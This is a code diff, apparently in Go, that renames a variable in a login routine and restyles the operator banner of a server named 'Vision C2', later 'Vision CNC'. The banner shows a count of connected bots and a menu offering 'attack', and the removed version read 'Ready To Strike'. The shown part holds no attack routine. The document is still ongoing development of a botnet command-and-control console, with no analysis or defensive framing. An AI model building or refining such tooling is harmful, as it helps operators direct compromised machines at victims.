@@ -48,11 +48,11 @@ type User struct {
 
 func AuthUser(username string, password string) (bool, *User) {
 	users := []User{}
-	usersFile, err := os.ReadFile(USERS_FILE)
+	usersData, err := os.ReadFile(usersFile)
 	if err != nil {
 		return false, nil
 	}
-	if err := json.Unmarshal(usersFile, &users); err != nil {
+	if err := json.Unmarshal(usersData, &users); err != nil {
 		logMsg("[AUTH] Failed to parse users.json: %v", err)
 		return false, nil
 	}
@@ -620,31 +620,39 @@ func RenderLockout(conn net.Conn) {
 	time.Sleep(2 * time.Second)
 }
 
-// RenderMainBanner shows the All-Seeing Eye banner with stats
+// RenderMainBanner shows the suave cursive banner with stats
 func RenderMainBanner(conn net.Conn) {
 	conn.Write([]byte(ClearScreen))
 	conn.Write([]byte("\r\n"))
 
-	conn.Write([]byte(ColorPurple1 + "                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple2 + "                        ░░▒▒▓▓████████████████████▓▓▒▒░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple3 + "                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple4 + "                 ░▓██▓░░  ╔═════════════════════════╗  ░░▓██▓░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple5 + "               ▒██▓░     ║" + ColorRed + "  ☾ " + ColorWhite + "V I S I O N " + ColorRed + "V " + ColorWhite + "C 2  " + ColorPurple5 + "  ║   ░▓██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple6 + "             ▒██▒        ╠═════════════════════════╣        ▒██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple7 + "            ▓█▓          ║ " + ColorGreen + "●" + ColorWhite + " Status:  " + ColorGreen + "ONLINE" + ColorPurple7 + "       ║         ▓█▓" + ColorReset + "\r\n")))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple8+"           ▓█▒           ║ "+ColorOrange+"◈"+ColorWhite+" Bots:    "+ColorGreen+"%-4d"+ColorPurple8+"         ║          ▒█▓"+ColorReset+"\r\n", getBotCount())))
-	conn.Write([]byte(fmt.Sprintf(ColorWhite+"          ▒█▓            ║ "+ColorOrange+"◈"+ColorWhite+" Proto:   "+ColorOrange+"%-11s"+ColorWhite+"  ║         ▓█▒"+ColorReset+"\r\n", PROTOCOL_VERSION)))
-	conn.Write([]byte(ColorPurple8 + "           ▓█▒           ║ " + ColorOrange + "◈" + ColorWhite + " Encrypt: " + ColorGreen + "TLS 1.3" + ColorPurple8 + "      ║        ▒█▓" + ColorReset + "\r\n"))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple7+"            ▓█▓          ║ "+ColorOrange+"◈"+ColorWhite+" RAM:     "+ColorGreen+"%-11s"+ColorPurple7+"  ║       ▓█▓"+ColorReset+"\r\n", formatRAM(getTotalRAM()))))
-	conn.Write([]byte(ColorPurple6 + "             ▒██▒        ╠═════════════════════════╣        ▒██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple5 + "               ▒██▓░     ║" + ColorGray + "  help " + ColorDarkGray + "• " + ColorGray + "attack " + ColorDarkGray + "• " + ColorGray + "exit  " + ColorPurple5 + " ║    ░▓██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple4 + "                 ░▓██▓░░ ╚═════════════════════════╝  ░░▓██▓░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple3 + "                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple2 + "                        ░░▒▒▓▓████████████████████▓▓▒▒░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple1 + "                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░" + ColorReset + "\r\n"))
+	// Cursive "Vision CNC" banner — Caligraphy font, purple gradient
+	conn.Write([]byte(ColorPurple1 + "     ***** *      **                                                               * ***         ***** *     **          * ***" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple2 + "  ******  *    *****     *                  *                                    *  ****  *   ******  **    **** *     *  ****  *" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple2 + " **   *  *       *****  ***                ***                                  *  *  ****   **   *  * **    ****     *  *  ****" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple3 + "*    *  **       * **    *                  *                                  *  **   **   *    *  *  **    * *     *  **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple3 + "    *  ***      *                 ****               ****                     *  ***            *  *    **   *      *  ***" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple4 + "   **   **      *      ***       * **** * ***       * ***  * ***  ****       **   **           ** **    **   *     **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple5 + "   **   **      *       ***     **  ****   ***     *   ****   **** **** *    **   **           ** **     **  *     **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple5 + "   **   **     *         **    ****         **    **    **     **   ****     **   **           ** **     **  *     **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple6 + "   **   **     *         **      ***        **    **    **     **    **      **   **           ** **      ** *     **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple6 + "   **   **     *         **        ***      **    **    **     **    **      **   **           ** **      ** *     **   **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple7 + "    **  **    *          **          ***    **    **    **     **    **       **  **           *  **       ***      **  **" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple7 + "     ** *     *          **     ****  **    **    **    **     **    **        ** *      *        *        ***       ** *      *" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple8 + "      ***     *          **    * **** *     **     ******      **    **         ***     *     ****          **        ***     *" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple8 + "       *******           *** *    ****      *** *   ****       ***   ***         *******     *  *****                  *******" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorPurple7 + "         ***              ***                ***                ***   ***          ***      *     **                     ***" + ColorReset + "\r\n"))
+
+	conn.Write([]byte("\r\n"))
+	conn.Write([]byte(ColorDarkGray + "   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─" + ColorReset + "\r\n"))
 	conn.Write([]byte("\r\n"))
 
-	conn.Write([]byte(ColorDarkGray + "                   ══════════ ☠ Ready To Strike ☠ ══════════" + ColorReset + "\r\n"))
+	// Stats section — clean, minimal
+	conn.Write([]byte(fmt.Sprintf("       "+ColorGreen+"● online"+ColorReset+"  "+ColorDarkGray+"·"+ColorReset+"  "+ColorPurple5+"%d"+ColorWhite+" bots"+ColorReset+"  "+ColorDarkGray+"·"+ColorReset+"  "+ColorPurple5+"%s"+ColorReset+"  "+ColorDarkGray+"·"+ColorReset+"  "+ColorGreen+"tls 1.3"+ColorReset+"  "+ColorDarkGray+"·"+ColorReset+"  "+ColorPurple5+"%s"+ColorReset+"\r\n",
+		getBotCount(), formatRAM(getTotalRAM()), PROTOCOL_VERSION)))
+	conn.Write([]byte("\r\n"))
+	conn.Write([]byte(ColorDarkGray + "   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorGray + "                              help  ·  attack  ·  exit" + ColorReset + "\r\n"))
+	conn.Write([]byte(ColorDarkGray + "   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─" + ColorReset + "\r\n"))
 	conn.Write([]byte("\r\n"))
 }
 
